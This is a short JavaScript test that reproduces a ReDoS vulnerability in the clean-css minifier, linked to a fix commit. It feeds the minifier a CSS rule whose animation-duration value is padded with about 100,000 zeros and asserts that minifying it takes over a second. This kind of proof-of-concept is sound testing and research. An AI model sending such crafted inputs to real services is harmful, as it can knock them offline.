//https://github.com/clean-css/clean-css/commit/2929bafbf8cdf7dccb24e0949c70833764fa87e3
test("ReDoS in clean-css", () => {
  const measureTime = require("./utils").measureTime;
  const CleanCSS = require("clean-css");

  let prefix = "-+.0";
  let suffix = "-0";
  let input;
  let pump = [];

  for (i = 0; i < 10000; i++) {
    pump.push("0000000000");
  }
  input =
    ".block{animation:1s test;animation-duration:" +
    prefix +
    pump.join("") +
    suffix +
    "s}";

  let t = measureTime(function () {
    new CleanCSS({ level: { 1: { replaceZeroUnits: false }, 2: true } }).minify(
      input
    );
  });
  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
